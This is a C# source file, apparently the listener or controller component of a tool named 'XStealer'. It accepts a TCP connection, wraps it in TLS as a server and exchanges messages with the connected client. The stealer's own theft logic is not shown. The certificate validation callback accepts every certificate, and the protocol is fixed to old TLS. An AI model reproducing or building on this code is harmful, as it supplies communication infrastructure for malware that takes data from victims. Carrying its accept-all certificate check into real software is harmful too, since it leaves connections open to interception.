using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;

namespace XStealer
{
    class SocketHandler
    {
        private static IPAddress localAdd = IPAddress.Parse(Form1.Ip);
        private static TcpListener listener = new TcpListener(localAdd, Form1.Port);
        private static TcpClient client;
        private static byte[] Buffer;
        private static SslStream sslStream;

        // Listen method
        public static void Listen()
        {
            // Start listener
            listener.Start();

            // Accept incoming connection(client)
            client = listener.AcceptTcpClient();

            // Stop listener
            listener.Stop();
        }

        // Connect method
        public static void Connect()
        {
            // Create new sslstream instace and validate certificate
            sslStream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);

            // Create new certificate instance
            X509Certificate2 cert = new X509Certificate2("SSLCert.crt");

            // Authenticate as server
            sslStream.AuthenticateAsServer(cert, false, SslProtocols.Tls, true);

            // Set receive timeout
            sslStream.ReadTimeout = 12000;
        }

        // ValidateServerCertificate method
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        // Disconnect method
        public static void Disconnect()
        {
            // Close socket
            client.Close();
        }

        // GetClientIp method
        public static string GetClientIp()
        {
            // Get client ip
            IPEndPoint ClientIp = client.Client.RemoteEndPoint as IPEndPoint;

            // Set variables
            string input = ClientIp.ToString();
            int index = input.IndexOf(":");

            // Check if index is greater than 0
            if (index > 0)
            {
                // Trim string
                input = input.Substring(0, index);
            }

            // Return client ip
            return input;
        }

        // Send method
        public static void Send(string Message)
        {
            // Write to the stream
            sslStream.Write(Encoding.ASCII.GetBytes(" " + Message), 0, Message.Length + 1);

            // Sleep for a short period of time to make sure the client receives the data
            Thread.Sleep(100);
        }

        // Receive method
        private static string TrimSpace;
        public static string Receive()
        {
            // Setup buffer
            Buffer = new byte[client.ReceiveBufferSize];

            // Read incoming data and strip front space
            for (int i = 0; i < 2; i++)
            {
                TrimSpace = Encoding.ASCII.GetString(Buffer, 0, sslStream.Read(Buffer, 0, Buffer.Length));
            }

            // Return data received
            return TrimSpace;
        }
    }
}
